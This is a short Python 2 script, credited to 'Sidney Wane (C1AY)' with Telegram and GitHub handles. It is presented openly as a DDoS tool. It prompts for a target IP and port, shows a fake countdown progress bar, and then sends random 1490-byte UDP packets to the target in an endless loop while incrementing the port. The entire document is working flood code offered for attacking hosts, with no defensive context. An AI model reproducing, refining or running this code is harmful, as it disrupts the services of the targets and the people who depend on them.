import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


os.system("clear")
os.system("figlet C 1 A Y")
print
print "Tool By.      : Sidney Wane(C1AY)"
print "Telegram .    : https://t.me/Sidneywane"
print "Github        : https://github.com/Sidneywane/"


print
ip = raw_input("Target IP Address : ")
port = input("Port [Default Port:80]    : ")






print "Starting Distributed Denial Of Service [DDOS] In 1 min and 10 seconds"
time.sleep(3)
print"==---------10%"
time.sleep(7)
print"===--------20%"
time.sleep(7)
print"====-------30%"
time.sleep(7)
print"=====------40%"
time.sleep(7)
print"======-----50%"
time.sleep(7)
print"=======----60%"
time.sleep(7)
print"========---70%"
time.sleep(7)
print"=========--80%"
time.sleep(7)
print"==========-90%"
time.sleep(7)
print"===========100%"
time.sleep(7)

os.system("clear")

os.system("figlet DDOS Attack Started Successfully")
sent = 0
while True:
		sock.sendto(bytes, (ip,port))
		sent=sent+1
		port=port+1
		print( "Sending %s packets to %s throught port:%s" % (sent, ip, port))
		if port==65534:
			port=1
		elif port==1900:
			port=1901